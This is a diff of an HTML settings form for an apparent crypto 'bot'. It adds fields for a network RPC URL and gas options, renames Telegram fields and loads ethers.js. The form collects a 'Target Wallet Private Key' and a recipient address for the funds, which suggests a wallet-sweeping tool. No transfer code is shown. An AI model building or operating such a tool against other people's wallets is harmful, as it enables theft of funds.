@@ -44,28 +44,30 @@
             <span class="close-btn" id="close-modal">&times;</span>
             <h2>Bot Settings</h2>
             <form id="settings-form">
+                <label for="network_rpc_url">RPC URL:</label>
+                <input type="text" id="network_rpc_url" placeholder="Enter Your Network RPC url" name="network_rpc_url">
+                
                 <label for="target_wallet_private_key">Target Wallet Private Key:</label>
                 <input type="text" id="target_wallet_private_key" placeholder="Target Wallet Private Key" name="target_wallet_private_key">
                 
-                <label for="recipient_address">Recipient Address:</label>
+                <label for="recipient_address">Recipient Wallet Address:</label>
                 <input type="text" id="recipient_address" placeholder="Burning Funds Recipient Wallet Address" name="recipient_address">
                 
                 <label for="telegram_user_id">Telegram User ID:</label>
-                <input type="text" id="telegram_user_id" placeholder="Your Telegram Id" name="telegram_user_id">
+                <input type="text" id="your_telegram_user_id" placeholder="Your Telegram Id" name="your_telegram_user_id">
                 
-                <label for="telegram_bot_token">Telegram Bot Token:</label>
-                <input type="text" id="telegram_bot_token" placeholder="Your Telegram Bot Token" name="telegram_bot_token">
+                <label for="your_telegram_bot_token">Telegram Bot Token:</label>
+                <input type="text" id="your_telegram_bot_token" placeholder="Your Telegram Bot Token" name="your_telegram_bot_token">
                 
                 <label for="network_name">Network Name:</label>
                 <input type="text" id="network_name" placeholder="Your Blockchain Network Name. Ex- Eth, Bsc, Polygon etc..." name="network_name">
                 
                 <h3>Optional Parameters:</h3>
-                
                 <label for="extra_gas_fee">Extra Gas Fee:</label>
-                <input type="text" id="extra_gas_fee" placeholder="Extra Gas Fee In Gwei" name="extra_gas_fee">
+                <input type="number" id="extra_gas_fee" value="1" placeholder="Extra Gas Fee In Gwei" name="extra_gas_fee">
                 
-                <label for="gas_limit">Extra Gas Limit:</label>
-                <input type="text" id="gas_limit" placeholder="Extra Gas Limit" name="gas_limit">
+                <label for="extra_gas_limit">Extra Gas Limit:</label>
+                <input type="number" id="extra_gas_limit" value="1" placeholder="Extra Gas Limit" name="extra_gas_limit">
                 
                 <button type="button" class="btn save-btn" id="save-btn">Save</button>
 
@@ -75,4 +77,6 @@
 
 </body>
 </html>
+
+<script src="src/ethers.min.js"></script>
 <script src="assets/js/terminal.js"></script>
